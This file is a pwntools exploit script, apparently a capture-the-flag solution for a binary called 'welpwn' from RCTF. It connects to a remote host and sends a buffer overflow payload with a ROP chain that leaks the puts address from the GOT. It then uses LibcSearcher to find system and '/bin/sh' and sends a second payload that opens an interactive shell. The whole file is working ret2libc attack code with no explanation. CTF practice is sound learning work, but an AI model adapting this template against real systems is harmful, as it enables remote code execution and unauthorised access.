from pwn import *
from LibcSearcher import *

context(log_level="debug", arch="amd64", os="linux")
# r = process("./welpwn")
r = remote("111.200.241.244", 62161)
elf = ELF("./welpwn")
pop_4 = 0x40089c
pop_rdi = 0x4008a3

junk = cyclic(24) + p64(pop_4)
rop = ROP(elf)
rop.call("puts", [elf.got["puts"]])
rop.call("main")
payload1 = junk + rop.chain()
r.recvuntil("Welcome to RCTF\n")
r.send(payload1)
r.recvuntil("Welcome to RCTF\n")
puts = u64(r.recv()[-7:-1] + b"\x00\x00")
log.debug("puts:" + hex(puts))

libc = LibcSearcher("puts", puts)
libc_base = puts - libc.dump("puts")
system = libc.dump("system") + libc_base
bin_sh = libc.dump("str_bin_sh") + libc_base

payload2 = junk + p64(pop_rdi) + p64(bin_sh) + p64(system)
r.sendline(payload2)
r.interactive()

# 0x000000000040089c: pop r12; pop r13; pop r14; pop r15; ret;
# 0x00000000004008a3: pop rdi; ret;